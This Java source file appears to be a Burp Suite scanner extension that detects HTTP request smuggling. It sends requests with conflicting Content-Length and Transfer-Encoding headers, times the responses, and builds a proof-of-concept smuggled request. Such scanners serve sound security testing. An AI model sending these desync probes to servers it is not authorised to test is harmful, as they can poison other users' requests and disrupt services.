package burp;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.nio.ByteBuffer;
import java.util.List;

public class SmuggleScan extends Scan implements IScannerCheck  {

    private Response buildPoc(byte[] req, IHttpService service) {
        byte[] badMethodIfChunked = Utilities.setHeader(req, "Connection", "keep-alive");


        //badMethodIfChunked = Utilities.setBody(badMethodIfChunked, "0\r\n\r\nG"+Utilities.helpers.bytesToString(req));
        badMethodIfChunked = Utilities.setHeader(badMethodIfChunked, "Content-Length", "6");
        badMethodIfChunked = makeChunked(badMethodIfChunked, 1, 0);
        ByteArrayOutputStream buf = new ByteArrayOutputStream();
        try {
            buf.write(badMethodIfChunked);
            buf.write("G".getBytes());
            buf.write(makeChunked(req, 0, 0));
        }
        catch (IOException e) {
            throw new RuntimeException();
        }

        return new Response(new Request(buf.toByteArray(), null, service));
    }

    void blah(byte[] req, IHttpService service) {
        Response poc = buildPoc(req, service);
        Response resp = request(service, poc.getReq().getRequest());
        resp.getReq().getResponse();

    }

    private byte[] makeChunked(byte[] baseReq, int contentLengthOffset, int chunkOffset) {
        byte[] chunkedReq = Utilities.setHeader(baseReq, "Transfer-Encoding", "chunked");
        int bodySize = baseReq.length - Utilities.getBodyStart(baseReq);
        String body = Utilities.getBody(baseReq);
        int chunkSize = bodySize+chunkOffset;
        if (chunkSize > 0) {
            chunkedReq = Utilities.setBody(chunkedReq, Integer.toHexString(chunkSize) + "\r\n" + body + "\r\n0\r\n\r\n");
        }
        else {
            chunkedReq = Utilities.setBody(chunkedReq, "0\r\n\r\n");
        }
        bodySize = chunkedReq.length - Utilities.getBodyStart(chunkedReq);
        chunkedReq = Utilities.setHeader(chunkedReq, "Content-Length", Integer.toString(bodySize+contentLengthOffset));
        return chunkedReq;
    }

    public List<IScanIssue> doScan(byte[] original, IHttpService service) {

        if (original[0] == 'G') {
            original = Utilities.helpers.toggleRequestMethod(original);
        }

        original = Utilities.addOrReplaceHeader(original, "Transfer-Encoding", "foo");
        original = Utilities.setHeader(original, "Connection", "close");

        byte[] baseReq = makeChunked(original, 0, 0);
//        baseReq = Utilities.setBody(baseReq, "0\r\n\r\n");
        Response syncedResp = request(service, baseReq);
        if (syncedResp.timedOut()) {
            Utilities.out("Timeout on first request. Aborting.");
            return null;
        }

        Response suggestedProbe = buildPoc(original, service);

        byte[] reverseLength = makeChunked(original, -1, 0); //Utilities.setHeader(baseReq, "Content-Length", "4");
        Response truncatedChunk = request(service, reverseLength);
        if (truncatedChunk.timedOut()) {
            Utilities.out("Reporting reverse timeout technique worked");
            report("Request smuggling v1-b", "Status:timeout", syncedResp, truncatedChunk, suggestedProbe);
            //return null;
        }
        else {
            byte[] dualChunkTruncate = Utilities.addOrReplaceHeader(reverseLength, "Transfer-encoding", "cow");
            Response truncatedDualChunk = request(service, dualChunkTruncate);
            if (truncatedDualChunk.timedOut()) {
                Utilities.out("Reverse timeout technique with dual TE header worked");
                report("Request smuggling v2", "Status:timeout", syncedResp, truncatedDualChunk, suggestedProbe);
            }
        }

        byte[] badLength = makeChunked(original, 1, 0); //Utilities.setHeader(baseReq, "Content-Length", "6");
        Response badLengthResp = request(service, badLength);
        if (!badLengthResp.timedOut() && badLengthResp.getInfo().getStatusCode() == syncedResp.getInfo().getStatusCode()) {
            Utilities.out("Overlong content length didn't cause a timeout or code-change. Aborting.");
            return null;
        }

        byte[] badChunk = Utilities.setBody(baseReq, "Z\r\n\r\n");
        badChunk = Utilities.setHeader(badChunk,"Content-Length", "5");
        Response badChunkResp = request(service, badChunk);
        if (badChunkResp.timedOut()) {
            Utilities.out("Bad chunk attack timed out. Aborting.");
            return null;
        }

        if (badChunkResp.getInfo().getStatusCode() == syncedResp.getInfo().getStatusCode()) {
            Utilities.out("Invalid chunk probe caused a timeout. Attempting chunk timeout instead.");

            byte[] timeoutChunk = makeChunked(original, 0, 1); //Utilities.setBody(baseReq, "1\r\n\r\n");
            badChunkResp = request(service, timeoutChunk);
            short badChunkCode = badChunkResp.getInfo().getStatusCode();
            if (! (badChunkResp.timedOut() || (badChunkCode != badLengthResp.getInfo().getStatusCode() && badChunkCode != syncedResp.getInfo().getStatusCode()))) {
                Utilities.out("Bad chunk didn't affect status code and chunk timeout failed. Aborting.");
                return null;
            }
        }

        report("Request smuggling v1", "Status:BadChunkDetection:BadLengthDetected", syncedResp, badChunkResp, badLengthResp, suggestedProbe);
        return null;
    }
}

